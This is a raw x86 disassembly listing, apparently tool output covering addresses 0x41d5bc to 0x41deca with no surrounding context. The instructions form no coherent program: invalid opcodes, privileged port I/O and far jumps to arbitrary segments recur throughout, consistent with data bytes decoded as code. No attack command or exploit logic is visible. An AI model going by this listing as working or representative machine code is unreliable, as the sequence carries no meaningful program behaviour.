  41d5bc:	push   0xff92bb3b
  41d5c1:	rcl    esi,1
  41d5c3:	adc    DWORD PTR [edx],0x58
  41d5c6:	in     al,dx
  41d5c7:	mov    ch,0x22
  41d5c9:	add    eax,0x247b5d49
  41d5ce:	jno    0x41d5aa
  41d5d0:	jbe    0x41d5c4
  41d5d2:	inc    edx
  41d5d3:	test   BYTE PTR [edx-0x17],bh
  41d5d6:	cli    
  41d5d7:	xchg   ebp,eax
  41d5d8:	inc    eax
  41d5d9:	(bad)
  41d5dc:	stc    
  41d5dd:	xor    al,0x18
  41d5df:	cmc    
  41d5e0:	xor    eax,0xb146f2aa
  41d5e5:	daa    
  41d5e6:	mov    ebx,0x4ea73391
  41d5eb:	lock mov dl,cl
  41d5ee:	xor    eax,0xaf2b400f
  41d5f3:	cmp    BYTE PTR [ebp+0xe],ch
  41d5f6:	stos   DWORD PTR es:[edi],eax
  41d5f7:	in     eax,dx
  41d5f8:	ret    
  41d5f9:	sbb    al,0x94
  41d5fb:	push   esi
  41d5fc:	cmp    esi,esp
  41d5fe:	inc    eax
  41d5ff:	les    ecx,FWORD PTR ds:0x34381164
  41d605:	sbb    ecx,DWORD PTR [ebp+0x29]
  41d608:	stos   BYTE PTR es:[edi],al
  41d609:	or     esi,DWORD PTR [edi+esi*1-0x17f9aaec]
  41d610:	and    DWORD PTR [edi-0x31],ecx
  41d613:	lea    eax,[ebp+edi*4-0x4b]
  41d617:	fld    QWORD PTR [esi-0xe]
  41d61a:	sbb    al,0xf9
  41d61c:	test   BYTE PTR [edx],0xf3
  41d61f:	xor    bh,BYTE PTR [esi-0x48eafa63]
  41d625:	mov    ecx,0x6f960d81
  41d62a:	call   0xa68ec889
  41d62f:	and    DWORD PTR [esi],ebp
  41d631:	outs   dx,BYTE PTR ds:[esi]
  41d632:	lock xchg edx,eax
  41d634:	out    dx,al
  41d635:	ins    DWORD PTR es:[edi],dx
  41d636:	jne    0x41d687
  41d638:	mov    bl,0x73
  41d63a:	mov    WORD PTR [edi],?
  41d63c:	mov    dl,0x82
  41d63e:	retf   
  41d63f:	xchg   ecx,eax
  41d640:	mov    edx,0x4058a67a
  41d646:	xchg   ebx,eax
  41d647:	dec    edi
  41d648:	jl     0x41d66c
  41d64a:	pop    eax
  41d64b:	outs   dx,BYTE PTR ds:[esi]
  41d64c:	fidivr WORD PTR [ecx]
  41d64e:	jbe    0x41d66c
  41d650:	cli    
  41d651:	xchg   ebx,eax
  41d652:	pop    ebx
  41d653:	ds stos BYTE PTR es:[edi],al
  41d655:	arpl   WORD PTR [ecx-0x4536f774],di
  41d65b:	adc    al,0x73
  41d65d:	out    0x19,al
  41d65f:	test   eax,0xe8edaa97
  41d664:	cmp    BYTE PTR [ebx-0x25],bl
  41d667:	xlat   BYTE PTR ds:[ebx]
  41d668:	push   0x58e45508
  41d66d:	mov    BYTE PTR [ecx-0xc596b6e],bh
  41d673:	push   ecx
  41d674:	xor    al,0xb
  41d676:	jbe    0x41d6e5
  41d678:	or     DWORD PTR [ebx],esi
  41d67a:	inc    esi
  41d67b:	lea    eax,[edx]
  41d67d:	scas   al,BYTE PTR es:[edi]
  41d67e:	dec    ebx
  41d67f:	mov    ds:0xf8af7be5,al
  41d684:	scas   al,BYTE PTR es:[edi]
  41d685:	fisttp QWORD PTR [eax-0x368baa7d]
  41d68b:	retf   0x6654
  41d68e:	xor    ch,bl
  41d690:	jecxz  0x41d6cf
  41d692:	inc    esp
  41d693:	test   eax,0xbe3a6764
  41d698:	ins    BYTE PTR es:[edi],dx
  41d699:	repz cmp DWORD PTR [edi+0x1ae3dcd],esp
  41d6a0:	sahf   
  41d6a1:	ret    0x3033
  41d6a4:	cmp    ah,BYTE PTR [ecx]
  41d6a6:	adc    esp,DWORD PTR [edi+0x1]
  41d6a9:	aad    0xdc
  41d6ab:	jae    0x41d653
  41d6ad:	test   DWORD PTR [edx-0x9],eax
  41d6b0:	inc    edx
  41d6b1:	repz mov ah,0xb8
  41d6b4:	test   eax,0x53bcd66b
  41d6b9:	push   ebx
  41d6ba:	(bad)  
  41d6bb:	push   0xb911c336
  41d6c0:	out    0xc1,al
  41d6c2:	or     al,0x7b
  41d6c4:	add    eax,0x21f29bf2
  41d6c9:	neg    bl
  41d6cb:	dec    ebx
  41d6cc:	xlat   BYTE PTR ds:[ebx]
  41d6cd:	dec    ebp
  41d6ce:	cwde   
  41d6cf:	into   
  41d6d0:	cdq    
  41d6d1:	mov    al,ds:0x33b74001
  41d6d6:	dec    edx
  41d6d7:	push   ss
  41d6d8:	popf   
  41d6d9:	loopne 0x41d713
  41d6db:	inc    esi
  41d6dc:	pop    ss
  41d6dd:	outs   dx,BYTE PTR ds:[esi]
  41d6de:	mov    eax,DWORD PTR [edx-0x5e]
  41d6e1:	(bad)  
  41d6e2:	pop    edx
  41d6e3:	popa   
  41d6e4:	add    bh,bl
  41d6e6:	cmp    bh,bl
  41d6e8:	lods   eax,DWORD PTR ds:[esi]
  41d6e9:	jmp    0xf2a8:0xe8a47c3b
  41d6f0:	or     al,0x58
  41d6f2:	xor    esi,DWORD PTR [ebp+0xb]
  41d6f5:	in     eax,dx
  41d6f6:	test   eax,0x87a00aa6
  41d6fb:	pop    ss
  41d6fc:	pushf  
  41d6fd:	cmp    dh,BYTE PTR [ecx-0x2562208a]
  41d703:	in     al,dx
  41d704:	popa   
  41d705:	cmp    eax,0x88870c8b
  41d70a:	xchg   esp,eax
  41d70b:	repnz pop es
  41d70d:	xor    edi,edx
  41d70f:	mov    ecx,0x78a260df
  41d714:	ja     0x41d6d6
  41d716:	mov    al,0x92
  41d718:	cdq    
  41d719:	repz dec esp
  41d71b:	pop    es
  41d71c:	idiv   BYTE PTR [ebx-0x233066f6]
  41d722:	int    0x99
  41d724:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41d726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d727:	mov    eax,0x1a9488
  41d72c:	add    eax,0x92ac67e9
  41d731:	leave  
  41d732:	js     0x41d6e5
  41d734:	icebp  
  41d735:	dec    edx
  41d736:	sub    BYTE PTR [eax],bh
  41d738:	shl    esp,0xa2
  41d73b:	push   ss
  41d73c:	lock jae 0x41d747
  41d73f:	xlat   BYTE PTR ds:[ebx]
  41d740:	jo     0x41d709
  41d742:	cmc    
  41d743:	pop    edi
  41d744:	mov    edi,0x5ee2467a
  41d749:	xchg   esi,eax
  41d74a:	inc    ecx
  41d74b:	imul   esp,esp,0x58
  41d74e:	add    BYTE PTR [ecx+eax*1],dh
  41d751:	and    al,BYTE PTR [eax-0x5]
  41d754:	mov    DWORD PTR [esi+0x1],esi
  41d757:	xor    BYTE PTR [edx],dh
  41d759:	xchg   ebx,eax
  41d75a:	mov    eax,0x7b763db7
  41d75f:	ret    0x95b9
  41d762:	nop
  41d763:	ins    BYTE PTR es:[edi],dx
  41d764:	dec    ax
  41d766:	add    al,0xfa
  41d768:	xor    al,0x4a
  41d76a:	fst    st(6)
  41d76c:	(bad)  
  41d76d:	cmp    edi,esp
  41d76f:	iret   
  41d770:	fnstsw WORD PTR [ecx]
  41d772:	xchg   ecx,eax
  41d773:	test   DWORD PTR [eax+0x7aced614],ebp
  41d779:	mov    dh,0x65
  41d77b:	test   eax,0xbfc0d86c
  41d780:	sub    al,0x6c
  41d782:	inc    esi
  41d783:	stc    
  41d784:	mov    eax,0xd819e51e
  41d789:	out    0x82,al
  41d78b:	mov    cs,WORD PTR [esi-0x59]
  41d78e:	and    BYTE PTR [eax],bh
  41d790:	icebp  
  41d791:	cmp    DWORD PTR [eax+0x4f],0xb8523bd0
  41d798:	or     eax,0x65c96d93
  41d79d:	aas    
  41d79e:	shr    DWORD PTR [ebx],0x65
  41d7a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7a2:	and    DWORD PTR [edi+edx*1+0x2e],eax
  41d7a6:	std    
  41d7a7:	fiadd  DWORD PTR [edi-0x1]
  41d7aa:	adc    DWORD PTR [ebx-0x57a03d44],edx
  41d7b0:	(bad)  
  41d7b1:	fnstcw WORD PTR [esi]
  41d7b3:	xor    al,0x6c
  41d7b5:	je     0x41d82a
  41d7b7:	push   ebx
  41d7b8:	rcr    bl,cl
  41d7ba:	repz pop ebx
  41d7bc:	mov    esp,DWORD PTR [esi+0x7a]
  41d7bf:	mov    edi,0x62454650
  41d7c4:	push   esi
  41d7c5:	rcr    DWORD PTR ds:0x2d16b2f7,0xc1
  41d7cc:	xchg   edx,eax
  41d7cd:	jno    0x41d7b1
  41d7cf:	das    
  41d7d0:	jno    0x41d77e
  41d7d2:	push   esp
  41d7d3:	or     BYTE PTR [ecx+0x75040e88],dl
  41d7d9:	mov    ebp,0xab1d427d
  41d7de:	inc    esp
  41d7df:	and    edi,DWORD PTR [ebx+0x3e4f4cde]
  41d7e5:	es ja  0x41d823
  41d7e8:	mov    cl,0xe2
  41d7ea:	jo     0x41d7db
  41d7ec:	jb     0x41d7d6
  41d7ee:	push   cs
  41d7ef:	xlat   BYTE PTR ds:[ebx]
  41d7f0:	push   esp
  41d7f1:	jmp    0x41d79f
  41d7f3:	aam    0xc9
  41d7f5:	mov    al,ds:0x37dceed0
  41d7fa:	call   0x6b85da47
  41d7ff:	adc    BYTE PTR [edx+0x66660176],0x8a
  41d806:	sar    DWORD PTR [ecx],1
  41d808:	or     BYTE PTR [edi],dl
  41d80a:	aas    
  41d80b:	leave  
  41d80c:	stc    
  41d80d:	cdq    
  41d80e:	(bad)  
  41d80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d810:	inc    ebp
  41d811:	jns    0x41d7ab
  41d813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d814:	cmp    al,0x1e
  41d816:	out    dx,al
  41d817:	jne    0x41d86e
  41d819:	add    edx,DWORD PTR [edi]
  41d81b:	jb     0x41d7c4
  41d81d:	xor    ch,0xc3
  41d820:	lea    ebp,[ecx]
  41d822:	lods   eax,DWORD PTR ds:[esi]
  41d823:	jl     0x41d806
  41d825:	mov    edx,?
  41d827:	popf   
  41d828:	pop    ebx
  41d829:	mov    ah,0xeb
  41d82b:	gs gs push edi
  41d82e:	sbb    ebp,DWORD PTR [ebx+0x6c]
  41d831:	dec    ecx
  41d832:	sub    al,0xf2
  41d834:	jmp    0x3520:0xbcd269c9
  41d83b:	es aad 0xe4
  41d83e:	mov    WORD PTR [ecx-0x62],?
  41d841:	in     al,dx
  41d842:	pop    ecx
  41d843:	aad    0x3d
  41d845:	jecxz  0x41d7ff
  41d847:	push   esp
  41d848:	stc    
  41d849:	clc    
  41d84a:	xchg   BYTE PTR [esi-0x17c56f50],bl
  41d850:	outs   dx,BYTE PTR ds:[esi]
  41d851:	adc    eax,0x71e943de
  41d856:	mov    edi,0x19784d35
  41d85b:	cs popf 
  41d85d:	(bad)  
  41d85e:	jmp    0x9404:0x953b1aa2
  41d865:	mov    dl,0x2b
  41d867:	push   0x6149e38d
  41d86c:	jmp    0x41d8ae
  41d86e:	pop    edi
  41d86f:	(bad)  
  41d870:	jl     0x41d8c7
  41d872:	adc    eax,edx
  41d874:	xor    eax,0x351d7b96
  41d879:	cmp    edx,esi
  41d87b:	lahf   
  41d87c:	out    dx,al
  41d87d:	fcom   QWORD PTR [ebp+0x7c626a0f]
  41d883:	push   edx
  41d884:	aaa    
  41d885:	pop    es
  41d886:	clc    
  41d887:	ds in  eax,0xc9
  41d88a:	aad    0x5b
  41d88c:	fsub   QWORD PTR [esp+eax*1]
  41d88f:	and    al,0x1c
  41d891:	bound  eax,QWORD PTR [edi-0x6172eaf9]
  41d897:	lods   al,BYTE PTR ds:[esi]
  41d898:	pushf  
  41d899:	inc    eax
  41d89a:	mov    BYTE PTR [eax],dl
  41d89c:	mov    ebx,0xe3c1bbb
  41d8a1:	pop    gs
  41d8a3:	jmp    0xbde3:0x287175fe
  41d8aa:	xor    eax,DWORD PTR [ebp+ecx*8+0x3d]
  41d8ae:	bound  esi,QWORD PTR [edi]
  41d8b0:	pushf  
  41d8b1:	(bad)  
  41d8b2:	std    
  41d8b3:	popf   
  41d8b4:	mov    ebx,0xc11d81b1
  41d8b9:	data16 sbb dh,0xd8
  41d8bd:	adc    eax,DWORD PTR [eax]
	...
  41da8b:	add    BYTE PTR [eax],al
  41da8d:	add    BYTE PTR [ebx-0x62],ah
  41da90:	mov    esi,0xff63ff63
  41da95:	sahf   
  41da96:	and    eax,0x80989286
  41da9b:	inc    edi
  41da9c:	mov    al,0xb4
  41da9e:	adc    BYTE PTR [eax+0x7250001],bh
  41daa4:	add    BYTE PTR [eax],al
  41daa6:	dec    ebx
  41daa7:	retf   
  41daa8:	pop    ebp
  41daa9:	icebp  
  41daaa:	jnp    0x41da99
  41daac:	ins    BYTE PTR es:[edi],dx
  41daad:	inc    ebp
  41daae:	mov    esi,0xe82b5f21
  41dab3:	pop    ds
  41dab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dab5:	addr16 xchg edx,eax
  41dab7:	jnp    0x41da9c
  41dab9:	adc    DWORD PTR ds:0x476b804c,ebp
  41dabf:	push   esp
  41dac0:	outs   dx,DWORD PTR ds:[esi]
  41dac1:	pushf  
  41dac2:	enter  0xa059,0x66
  41dac6:	inc    eax
  41dac7:	addr16 push ebx
  41dac9:	mov    dh,0x8f
  41dacb:	popa   
  41dacc:	sub    ebp,DWORD PTR [edx+0x15a71807]
  41dad2:	jecxz  0x41da80
  41dad4:	call   0x956cbca3
  41dad9:	push   edi
  41dada:	mov    dl,0x9f
  41dadc:	scas   al,BYTE PTR es:[edi]
  41dadd:	test   al,0xaa
  41dadf:	and    al,0xf0
  41dae1:	jecxz  0x41db14
  41dae3:	ins    DWORD PTR es:[edi],dx
  41dae4:	inc    edi
  41dae5:	dec    edi
  41dae6:	sahf   
  41dae7:	xchg   esp,eax
  41dae8:	repz clc 
  41daea:	test   BYTE PTR [eax+0xd],dh
  41daed:	jecxz  0x41da93
  41daef:	mov    bl,0x22
  41daf1:	mov    dl,0xf
  41daf3:	mov    esi,0x3774443f
  41daf8:	lods   al,BYTE PTR ds:[esi]
  41daf9:	ror    DWORD PTR [esi-0x4211d4b8],1
  41daff:	stos   DWORD PTR es:[edi],eax
  41db00:	xchg   edx,eax
  41db01:	mov    dh,0xaa
  41db03:	mov    al,ds:0xb74573a9
  41db08:	shr    BYTE PTR [ebx+0x76],cl
  41db0b:	xor    al,0x83
  41db0d:	out    dx,eax
  41db0e:	popa   
  41db0f:	ja     0x41db53
  41db11:	xor    BYTE PTR [ecx],ah
  41db13:	dec    ebp
  41db14:	mov    ecx,0xac7a76a7
  41db19:	xchg   edi,eax
  41db1a:	hlt    
  41db1b:	adc    ch,BYTE PTR [eax]
  41db1d:	rol    BYTE PTR [edx+0x24],cl
  41db20:	dec    ebp
  41db21:	jb     0x41db0b
  41db23:	popa   
  41db24:	and    ah,dh
  41db26:	mov    eax,0x76f7e3d8
  41db2b:	mov    WORD PTR [edi-0x20],es
  41db2e:	pop    ds
  41db2f:	in     eax,0x36
  41db31:	into   
  41db32:	xchg   ecx,eax
  41db33:	adc    ah,bh
  41db35:	xchg   esp,eax
  41db36:	(bad)  
  41db37:	jno    0x41daf7
  41db39:	mov    eax,0x9edc790c
  41db3e:	adc    ch,BYTE PTR [eax+0x35]
  41db41:	push   edx
  41db42:	add    bl,al
  41db44:	neg    DWORD PTR [ecx+0x5c]
  41db47:	popa   
  41db48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db49:	xchg   edi,eax
  41db4a:	aas    
  41db4b:	mov    gs,edi
  41db4d:	jecxz  0x41db60
  41db4f:	into   
  41db50:	(bad)  
  41db51:	cwde   
  41db52:	jmp    0x41db07
  41db54:	inc    ecx
  41db55:	adc    BYTE PTR [esi+0x6c0a7576],dl
  41db5b:	sub    BYTE PTR [esi],0xbf
  41db5e:	repz cmp al,0x9d
  41db61:	xor    eax,0x97bfdf8a
  41db66:	pop    ss
  41db67:	and    ebp,DWORD PTR [ebx-0xe]
  41db6a:	cdq    
  41db6b:	inc    esi
  41db6c:	js     0x41dbb7
  41db6e:	leave  
  41db6f:	mov    eax,0x56d42fdd
  41db74:	(bad)  [ebp+0x7ee9508b]
  41db7a:	loop   0x41db67
  41db7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db7d:	hlt    
  41db7e:	aad    0xd9
  41db80:	mov    eax,ds:0x8b6ab4f2
  41db85:	mov    esp,0x55bdb57e
  41db8a:	sub    ecx,DWORD PTR [ebx]
  41db8c:	jnp    0x41dbdb
  41db8e:	jb     0x41dbc5
  41db90:	push   eax
  41db91:	push   ebp
  41db92:	sbb    BYTE PTR [ecx+0x361787d9],0xe8
  41db99:	adc    DWORD PTR [edx+0x43fd27d5],ebx
  41db9f:	add    esp,edi
  41dba1:	or     eax,0x418ca35e
  41dba6:	fwait
  41dba7:	stos   BYTE PTR es:[edi],al
  41dba8:	xor    BYTE PTR [esi],dh
  41dbaa:	out    dx,eax
  41dbab:	jne    0x41dbb6
  41dbad:	mov    eax,ds:0xeeee696b
  41dbb2:	mov    al,0x96
  41dbb4:	pop    ecx
  41dbb5:	pop    ebp
  41dbb6:	cmp    DWORD PTR [edi+edx*2-0x3329eaaa],esi
  41dbbd:	(bad)  
  41dbbe:	div    BYTE PTR [ebx+0x64d5f2f5]
  41dbc4:	fadd   DWORD PTR [ebx-0x5ccca39d]
  41dbca:	fisubr WORD PTR [esi-0x7b29fb4c]
  41dbd0:	push   ss
  41dbd1:	lods   eax,DWORD PTR ds:[esi]
  41dbd2:	out    0x58,al
  41dbd4:	in     eax,dx
  41dbd5:	dec    esp
  41dbd6:	or     di,WORD PTR [edi+0x60]
  41dbda:	pop    ebx
  41dbdb:	mov    bh,0x67
  41dbdd:	imul   ebx,esi,0x3a
  41dbe0:	ror    bl,0xd4
  41dbe3:	mov    BYTE PTR [ebp-0x6ff016e6],bl
  41dbe9:	fdiv   st(7),st
  41dbeb:	sub    ch,BYTE PTR [edx+0x73]
  41dbee:	or     edi,DWORD PTR [esi-0x47]
  41dbf1:	aaa    
  41dbf2:	mov    al,ds:0xd30c923c
  41dbf7:	add    al,0xb5
  41dbf9:	fistp  WORD PTR [ebx-0x3]
  41dbfc:	inc    esp
  41dbfd:	jnp    0x41dc34
  41dbff:	xchg   ebx,eax
  41dc00:	jp     0x41dbdc
  41dc02:	dec    ecx
  41dc03:	inc    eax
  41dc04:	mov    ebx,0x7c1c2f68
  41dc09:	scas   eax,DWORD PTR es:[edi]
  41dc0a:	cli    
  41dc0b:	adc    al,0xcf
  41dc0d:	mov    ds:0x5417c077,al
  41dc12:	jl     0x41dc0c
  41dc14:	pop    edx
  41dc15:	retf   0xa54b
  41dc18:	icebp  
  41dc19:	or     cl,BYTE PTR [edi+0x1]
  41dc1c:	mov    bl,0x9a
  41dc1e:	(bad)  
  41dc20:	addr16 push edi
  41dc22:	mov    ecx,0xfe2028e5
  41dc27:	(bad)
  41dc2b:	or     DWORD PTR [esp+edi*1+0x1f608062],0x1001710b
  41dc36:	add    BYTE PTR [eax+ecx*8],cl
  41dc39:	(bad)  
  41dc3a:	ss popf 
  41dc3c:	bound  edi,QWORD PTR [ebx+0x1ab8f434]
  41dc42:	push   es
  41dc43:	mov    dh,BYTE PTR [ebp+esi*1+0x7f]
  41dc47:	rol    BYTE PTR [edx],cl
  41dc49:	xchg   BYTE PTR [esi+0x32],cl
  41dc4c:	aad    0x8a
  41dc4e:	jb     0x41dc1d
  41dc50:	or     eax,0x3fe649d2
  41dc55:	add    al,BYTE PTR [ecx-0x5eaf8988]
  41dc5b:	popf   
  41dc5c:	jle    0x41dbf1
  41dc5e:	xlat   BYTE PTR ds:[ebx]
  41dc5f:	jl     0x41dcdf
  41dc61:	xor    dl,BYTE PTR [ebx+0x52ff094c]
  41dc67:	lea    eax,ds:0x79594597
  41dc6d:	popa   
  41dc6e:	ficom  WORD PTR [edi-0x66]
  41dc71:	and    eax,0xad56f28f
  41dc76:	push   esi
  41dc77:	add    eax,0xb98804b2
  41dc7c:	cdq    
  41dc7d:	daa    
  41dc7e:	dec    esi
  41dc7f:	in     eax,dx
  41dc80:	(bad)  
  41dc81:	mov    edi,0x2e89a70d
  41dc86:	fs dec edx
  41dc88:	test   BYTE PTR [edx+0x61b13f7b],dl
  41dc8e:	mov    al,ds:0x82789a05
  41dc93:	or     bh,dh
  41dc95:	xor    ebx,DWORD PTR [ebp-0x2a]
  41dc98:	mov    eax,0x5c257146
  41dc9d:	push   edi
  41dc9e:	stos   BYTE PTR es:[edi],al
  41dc9f:	aas    
  41dca0:	sahf   
  41dca1:	in     al,0xd5
  41dca3:	(bad)  
  41dca4:	in     eax,0x96
  41dca6:	mov    dl,0x8b
  41dca8:	inc    esi
  41dca9:	das    
  41dcaa:	ins    DWORD PTR es:[edi],dx
  41dcab:	dec    ebx
  41dcac:	mov    ds:0xf1ed8d9,eax
  41dcb1:	mov    eax,ds:0x29cd719e
  41dcb6:	or     eax,0x4dd92d7c
  41dcbb:	mov    ch,0x48
  41dcbd:	sub    dh,bl
  41dcbf:	adc    ch,BYTE PTR [ecx-0x290b129f]
  41dcc5:	jnp    0x41dca1
  41dcc7:	jg     0x41dc64
  41dcc9:	dec    ebp
  41dcca:	faddp  st(6),st
  41dccc:	int3   
  41dccd:	sar    al,1
  41dccf:	jp     0x41dd06
  41dcd1:	mov    ecx,0xfd00d15a
  41dcd6:	dec    esp
  41dcd7:	leave  
  41dcd8:	inc    edi
  41dcd9:	pop    ds
  41dcda:	(bad)  
  41dcdb:	mov    cl,0xe1
  41dcdd:	jbe    0x41dc80
  41dcdf:	in     eax,dx
  41dce0:	and    al,0xdd
  41dce2:	out    dx,al
  41dce3:	push   ecx
  41dce4:	imul   edi,DWORD PTR [esi],0x2f
  41dce7:	or     al,0x4e
  41dce9:	(bad)  
  41dcea:	or     al,0xc1
  41dcec:	das    
  41dced:	gs je  0x41dc96
  41dcf0:	pop    edi
  41dcf1:	sub    BYTE PTR [edx-0x5b18f85d],ch
  41dcf7:	mov    al,0x51
  41dcf9:	dec    si
  41dcfb:	loop   0x41dc8d
  41dcfd:	fimul  WORD PTR [edi]
  41dcff:	jb     0x41dd64
  41dd01:	stos   DWORD PTR es:[edi],eax
  41dd02:	stc    
  41dd03:	div    BYTE PTR [edi+0x1e]
  41dd06:	push   ds
  41dd07:	adc    ebp,ecx
  41dd09:	mov    ah,BYTE PTR [esi]
  41dd0b:	ss or  al,0xe8
  41dd0e:	lahf   
  41dd0f:	jo     0x41dce7
  41dd11:	xor    ecx,esp
  41dd13:	add    cl,BYTE PTR [edi+0x64]
  41dd16:	mov    dh,0xbc
  41dd18:	(bad)  
  41dd19:	cmp    esi,DWORD PTR [ecx-0x6a32ca84]
  41dd1f:	push   ss
  41dd20:	xchg   ecx,eax
  41dd21:	inc    ebp
  41dd22:	jl     0x41dcb8
  41dd24:	xacquire xchg BYTE PTR [ebx-0x5c],cl
  41dd28:	xchg   esi,eax
  41dd29:	int    0x31
  41dd2b:	dec    ecx
  41dd2c:	imul   edi,DWORD PTR [ebp-0x79],0x24951f37
  41dd33:	add    ebp,DWORD PTR [eax]
  41dd35:	fdivr  st(6),st
  41dd37:	scas   al,BYTE PTR es:[edi]
  41dd38:	data16 std 
  41dd3a:	mov    ax,ds:0xf99dd06d
  41dd40:	push   esp
  41dd41:	xchg   edx,eax
  41dd42:	retf   
  41dd43:	push   ss
  41dd44:	xor    eax,0x9a042567
  41dd49:	inc    esp
  41dd4a:	fwait
  41dd4b:	cwde   
  41dd4c:	xchg   BYTE PTR [ebx],bl
  41dd4e:	sub    BYTE PTR [ebx],dh
  41dd50:	mov    esp,0xe3100a7b
  41dd55:	dec    edi
  41dd56:	and    eax,0x8dc76003
  41dd5b:	lahf   
  41dd5c:	outs   dx,BYTE PTR ds:[esi]
  41dd5d:	jecxz  0x41dd14
  41dd5f:	mov    dl,0x1c
  41dd61:	ret    
  41dd62:	fadd   DWORD PTR [eax-0xb6927f6]
  41dd68:	loopne 0x41dd00
  41dd6a:	ret    0xb610
  41dd6d:	jae    0x41ddcc
  41dd6f:	ret    
  41dd70:	aaa    
  41dd71:	pop    ds
  41dd72:	lods   al,BYTE PTR ds:[esi]
  41dd73:	aas    
  41dd74:	loope  0x41dd52
  41dd76:	and    dh,cl
  41dd78:	push   edx
  41dd79:	add    esi,ebp
  41dd7b:	ins    DWORD PTR es:[edi],dx
  41dd7c:	(bad)  
  41dd7d:	ja     0x41ddbc
  41dd7f:	sbb    eax,0xe681020a
  41dd84:	jge    0x41dd4f
  41dd86:	out    dx,eax
  41dd87:	cli    
  41dd88:	(bad)  
  41dd89:	jecxz  0x41dd3a
  41dd8b:	sbb    BYTE PTR [eax+ecx*8-0x2c],dh
  41dd8f:	shl    ch,cl
  41dd91:	jl     0x41de12
  41dd93:	rol    bh,0x1f
  41dd96:	lahf   
  41dd97:	push   ecx
  41dd98:	cmp    DWORD PTR [esi],ecx
  41dd9a:	test   eax,0xf903ff6a
  41dd9f:	daa    
  41dda0:	imul   esp,DWORD PTR [edi],0xfffffffa
  41dda3:	inc    edi
  41dda4:	sub    ch,BYTE PTR [esi+0x40998a92]
  41ddaa:	sbb    DWORD PTR [ebp-0x10],eax
  41ddad:	xor    al,0x72
  41ddaf:	or     al,0x1c
  41ddb1:	test   DWORD PTR [edx-0x4c],ebp
  41ddb4:	mov    ch,0xd
  41ddb6:	int3   
  41ddb7:	in     al,0xaf
  41ddb9:	out    dx,eax
  41ddba:	pop    es
  41ddbb:	xor    DWORD PTR [esi-0x72],0xffffff93
  41ddbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddc0:	in     eax,dx
  41ddc1:	(bad)  
  41ddc2:	imul   eax,DWORD PTR [esi+0x1063cccb],0xfcb9893b
  41ddcc:	test   al,0x35
  41ddce:	sar    BYTE PTR [eax-0x38f205f5],0xec
  41ddd5:	pop    eax
  41ddd6:	xor    eax,edx
  41ddd8:	dec    ecx
  41ddd9:	lahf   
  41ddda:	push   ecx
  41dddb:	mov    esp,0xc4b57908
  41dde0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dde1:	mov    ds:0x945822ba,eax
  41dde6:	push   es
  41dde7:	data16 idiv BYTE PTR [edx+edx*8-0x70fa3b1a]
  41ddef:	mov    ds:0x7ada3338,eax
  41ddf4:	das    
  41ddf5:	adc    al,0x91
  41ddf7:	pushf  
  41ddf8:	sub    esp,esi
  41ddfa:	das    
  41ddfb:	in     al,0x73
  41ddfd:	addr16 (bad) 
  41ddff:	push   eax
  41de00:	cld    
  41de01:	cmp    ah,cl
  41de03:	dec    ebp
  41de04:	jge    0x41ddcc
  41de06:	pushf  
  41de07:	loopne 0x41de00
  41de09:	pop    ecx
  41de0a:	pushf  
  41de0b:	xchg   ecx,eax
  41de0c:	push   ss
  41de0d:	and    cl,BYTE PTR [ebx-0x5fd8992e]
  41de13:	mov    dl,bl
  41de15:	sub    BYTE PTR [eax+0x5bc3e768],cl
  41de1b:	out    dx,eax
  41de1c:	mov    al,ds:0xb0a9470b
  41de21:	sahf   
  41de22:	test   DWORD PTR [edx+0x4b7135be],ebp
  41de28:	inc    esp
  41de29:	dec    esi
  41de2a:	jp     0x41de38
  41de2c:	jmp    0xbdf4:0x2cc679a8
  41de33:	xchg   edx,eax
  41de34:	inc    ebx
  41de35:	xchg   ecx,eax
  41de36:	cmp    eax,0xbb575b43
  41de3b:	dec    esp
  41de3c:	ja     0x41de42
  41de3e:	fs ret 0x2db0
  41de42:	mov    edx,0xd110090d
  41de47:	mov    BYTE PTR [ecx+eiz*8],0x3c
  41de4b:	addr16 mov esi,0xc2da4c16
  41de51:	dec    ebx
  41de52:	and    al,0xd3
  41de54:	mov    ebx,0xbc87ecc5
  41de59:	ds les edx,FWORD PTR cs:[edx]
  41de5d:	fucomip st,st(2)
  41de5f:	push   0x62
  41de61:	cmc    
  41de62:	lss    ebx,FWORD PTR [esi+0x1a]
  41de66:	mov    dl,0xb4
  41de68:	aas    
  41de69:	shl    BYTE PTR [eax+0x1bb07393],0xeb
  41de70:	mov    ?,WORD PTR [eax-0x23]
  41de73:	outs   dx,BYTE PTR ds:[esi]
  41de74:	pop    esi
  41de75:	sbb    BYTE PTR [ebp+0x35b505f1],ah
  41de7b:	jnp    0x41dea3
  41de7d:	loop   0x41de5c
  41de7f:	aas    
  41de80:	and    edi,DWORD PTR [ecx+edi*4+0x3cf0e79a]
  41de87:	iret   
  41de88:	retf   
  41de89:	or     ch,bh
  41de8b:	pusha  
  41de8c:	cmp    bh,BYTE PTR [esp+ebx*8-0x46]
  41de90:	push   edx
  41de91:	arpl   WORD PTR [edx],sp
  41de93:	fisubr WORD PTR [edi-0x41]
  41de96:	jl     0x41de45
  41de98:	push   ss
  41de99:	push   ebp
  41de9a:	jns    0x41de61
  41de9c:	mov    al,0xf2
  41de9e:	scas   al,BYTE PTR es:[edi]
  41de9f:	int    0x61
  41dea1:	(bad)  
  41dea2:	mov    ecx,0xf1a0232b
  41dea7:	outs   dx,DWORD PTR ds:[esi]
  41dea8:	shr    al,0x9d
  41deab:	in     al,dx
  41deac:	xchg   ebp,eax
  41dead:	out    0xcb,eax
  41deaf:	stos   BYTE PTR es:[edi],al
  41deb0:	ja     0x41de50
  41deb2:	(bad)  
  41deb3:	jmp    0x1cc9:0x18342e5f
  41deba:	add    eax,0x33d91ec0
  41debf:	pushf  
  41dec0:	sbb    DWORD PTR [edi-0x53],esp
  41dec3:	jae    0x41df19
  41dec5:	pop    ds
  41dec6:	out    0x60,al
  41dec8:	fld    QWORD PTR [edx]
  41deca:	inc    ebp
